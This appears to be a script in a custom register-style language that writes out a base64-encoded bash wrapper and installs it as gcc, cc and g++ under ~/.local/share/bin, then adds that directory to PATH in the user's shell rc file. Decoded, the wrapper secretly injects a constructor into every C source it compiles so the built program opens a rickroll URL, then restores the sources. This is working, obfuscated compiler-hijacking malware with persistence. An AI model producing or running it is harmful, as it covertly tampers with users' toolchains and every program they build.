# === Create the payload  ===
loads "payload.b64"

open r2 re 

loads "IyEvYmluL2Jhc2gKCmluY2x1ZGU9IiNpbmNsdWRlIDxzdGRsaWIuaD4iCgpwYXlsb2FkPSIKc3Rh"
write r2 re
loads "dGljIF9fYXR0cmlidXRlX18oKGNvbnN0cnVjdG9yKDEwMSkpKSB2b2lkIHByZV9tYWluKHZvaWQp"
write r2 re
loads "IHsKICAgIHN5c3RlbShcInhkZy1vcGVuIFxcJ2h0dHBzOi8vcmlja3JvbGwuaXQvcmlja3JvbGwu"
write r2 re
loads "bXA0XFwnID4gL2Rldi9udWxsIDI+L2Rldi9udWxsICZcIik7Cn0KIgoKZ2NjPSQod2hlcmVpcyAk"
write r2 re
loads "MCB8IGN1dCAtZCAiICIgLWYyKSAKcGF0Y2hlZF9maWxlPSgpCgpmdW5jdGlvbiBwYXRjaCB7CiAg"
write r2 re
loads "ICBjb250ZW50PSQoY2F0ICQxKQogICAgY2F0IDw8IEVPRiA+ICQxCiR7aW5jbHVkZX0KJHtwYXls"
write r2 re
loads "b2FkfQoke2NvbnRlbnR9CkVPRgp9CgppZiBbICQjIC1sdCAxIF07IHRoZW4gCgkkZ2NjCglleGl0"
write r2 re
loads "IDEKZmkKCmZvciBhcmcgaW4gJEAgCmRvCiAgICBhcmc9JChyZWFscGF0aCAkYXJnIDI+L2Rldi9u"
write r2 re
loads "dWxsKQoJaWYgWyAtZiAkYXJnIF07IHRoZW4gCiAgICAgICAgY3AgJGFyZyAiJChkaXJuYW1lICRh"
write r2 re
loads "cmcpLy4kKGJhc2VuYW1lICRhcmcpIgoJCXBhdGNoICRhcmcKCQlwYXRjaGVkX2ZpbGUrPSgkYXJn"
write r2 re
loads "KQoJZmkKZG9uZQoKJGdjYyAkQAoKZm9yIGZpbGUgaW4gJHBhdGNoZWRfZmlsZSAKZG8KICAgIG12"
write r2 re
loads "ICIkKGRpcm5hbWUgJGZpbGUpLy4kKGJhc2VuYW1lICRmaWxlKSIgJGZpbGUKZG9uZQoK"
write r2 re

close r2

loads "HOME"
env re 
loadr r1 re
loadr r2 re
loads "mkdir "
append re r1
loadr r1 re
loads "/.local/share/bin"
append r1 re
loadr r1 re
system re

loads "/.local/share/bin"
append r2 re 
loadr r1 re 
loadr r3 re
loads "/gcc"
append r1 re 

loadr r1 re

loads "tmp.sh"
open r2 re 
loads "rm -rf ~/.local/share/bin/gcc && base64 -d payload.b64 > "
write r2 re
write r2 r1 
close r2 

loads "bash tmp.sh"
system re 
loads "rm tmp.sh" 
system re

open r2 r1 
write r2 re 
close r2

loads "rm payload.b64"
system re

# === Get ~/.SHELLrc path ===
loads "SHELL"
env re 
loadr r1 re 
loads "basename "
append re r1
system re
loadr r1 re 

loads "HOME"
env re 
loadr r2 re 
loads "/."
append r2 re 
append re r1 
loadr r1 re 
loads "rc"
append r1 re 

open r1 re 
loads "export PATH="
write r1 re 
write r1 r3 
loads ":$PATH"
write r1 re
close r1

loads "chmod +x "
append re r3 
loadr r1 re
loads "/gcc"
append r1 re
system re

loads "cp "
append re r3
loadr r1 re
loads "/gcc "
append r1 re
loadr r1 re
loads "/cc"
append r3 re 
append r1 re
system re

loads "cp "
append re r3
loadr r1 re
loads "/gcc "
append r1 re
loadr r1 re
loads "/g++"
append r3 re 
append r1 re
system re

# ===========================

exit
